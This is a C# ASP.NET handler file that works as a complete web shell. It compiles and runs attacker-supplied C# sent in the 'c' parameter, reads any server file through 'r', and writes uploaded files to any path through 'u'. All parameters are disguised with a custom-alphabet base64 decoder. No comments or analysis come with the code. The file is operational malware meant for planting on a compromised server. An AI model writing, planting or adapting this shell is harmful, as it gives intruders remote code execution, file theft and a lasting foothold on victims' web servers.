<%@ WebHandler Language="C#" class="DynamicCodeCompiler"%>
using System;
using System.Web;
using System.CodeDom.Compiler;
using System.Reflection;
using System.Text;
using System.IO;

public partial class DynamicCodeCompiler : IHttpHandler
{
    public bool IsReusable
    {
        get { return false; }
    }

    public static string SourceText(string txt)
    {
            StringBuilder sb = new StringBuilder();
            sb.Append("using System;");
            sb.Append(Environment.NewLine);
            sb.Append("namespace  Neteye");
            sb.Append(Environment.NewLine);
            sb.Append("{");
            sb.Append(Environment.NewLine);
            sb.Append("    public class NeteyeInput");
            sb.Append(Environment.NewLine);
            sb.Append("    {");
            sb.Append(Environment.NewLine);
            sb.Append("        public void OutPut()");
            sb.Append(Environment.NewLine);
            sb.Append("        {");
            sb.Append(Environment.NewLine);
            sb.Append(txt);
            sb.Append(Environment.NewLine);
            sb.Append("        }");
            sb.Append(Environment.NewLine);
            sb.Append("    }");
            sb.Append(Environment.NewLine);
            sb.Append("}");
            string code = sb.ToString();
            return code;
    }
	
    public static void DynamicCodeExecute(string txt)
    {
            CodeDomProvider compiler = CodeDomProvider.CreateProvider("C#");
            CompilerParameters comPara = new CompilerParameters();
            comPara.ReferencedAssemblies.Add("System.dll");
            comPara.GenerateExecutable = false;
            comPara.GenerateInMemory = true;
            CompilerResults compilerResults = compiler.CompileAssemblyFromSource(comPara, SourceText(txt)); 
            Assembly objAssembly = compilerResults.CompiledAssembly;
            object objInstance = objAssembly.CreateInstance("Neteye.NeteyeInput");
            MethodInfo objMifo = objInstance.GetType().GetMethod("OutPut");
            var result = objMifo.Invoke(objInstance, null);
    }

    public static string Decrpt(string data){
	    string str="RTU123def9op567qrxSyzABtuvCD480abcEOPjklmnQVWswXYZ-GHIJ_ghi/FKLMN";
		char[] chars=str.ToCharArray();
		string rdata=data.Replace("N","");
		char[] tdata=rdata.ToCharArray();
		char[] result=new char[(tdata.Length+3)/4*3];
		int index=0;
		for(int i=0;i<tdata.Length/4*4;i+=4){
		    int bits=Array.IndexOf(chars,tdata[i])<<18 | Array.IndexOf(chars,tdata[i+1])<<12 | Array.IndexOf(chars,tdata[i+2])<<6 | Array.IndexOf(chars,tdata[i+3]);
			result[index++]=(char)(bits>>16 & 0xff);
			result[index++]=(char)(bits>>8 & 0xff);
			result[index++]=(char)(bits & 0xff);
		}
		if(tdata.Length%4==2){
		    int bits=Array.IndexOf(chars,tdata[tdata.Length-2])<<2 | Array.IndexOf(chars,tdata[tdata.Length-1])>>4;
			result[index++]=(char)(bits & 0xff);
			char[] temp=new char[result.Length-2];
			for(int j=0;j<result.Length-2;j++){
			    temp[j]=result[j];
			}
			return new string(temp);
		}
		else if(tdata.Length%4==3){
		    int bits=Array.IndexOf(chars,tdata[tdata.Length-3])<<10 | Array.IndexOf(chars,tdata[tdata.Length-2])<<4 | Array.IndexOf(chars,tdata[tdata.Length-1])>>2;
			result[index++]=(char)(bits>>8 & 0xff);
			result[index++]=(char)(bits & 0xff);
			char[] temp=new char[result.Length-1];
			for(int j=0;j<result.Length-1;j++){
			    temp[j]=result[j];
			}
			return new string(temp);
		}
		return new string(result);
	}
	
    public void ProcessRequest(HttpContext context)
    {
            if (!string.IsNullOrEmpty(context.Request["c"]))
            {
			    context.Response.ContentType = "text/plain";
                DynamicCodeExecute(Decrpt(context.Request["c"]));
                context.Response.Write("OK!!!");
            }
            else if (!string.IsNullOrEmpty(context.Request["r"])) 
            {   
			    string name=Decrpt(context.Request["r"]);
			    string[] fname=name.Split('/');
			    context.Response.ContentType = "application/octet-stream";
				context.Response.AddHeader("content-disposition", "attachment;filename="+fname[fname.Length-1]);
				context.Response.WriteFile(name);
            }
			else if (!string.IsNullOrEmpty(context.Request["u"]))
			{
			    context.Response.ContentType = "text/html;charset=utf-8";
				if (context.Request.Files.Count > 0)
				{
					HttpPostedFile file = context.Request.Files[0];
					string fileName = Path.GetFileName(file.FileName);
					string path = Decrpt(context.Request["u"]) + "/"+fileName;
					file.SaveAs(path);
					context.Response.Write(@"success: " + path);
				}
				
				context.Response.Write(@"
				<form action='"+context.Request.RawUrl.ToString()+@"' method='post' enctype='multipart/form-data'>
					<input type='file' name='upload_file' />
					<input type='submit'>
				</form>");
			    
			}
			else{
			}
    }
}
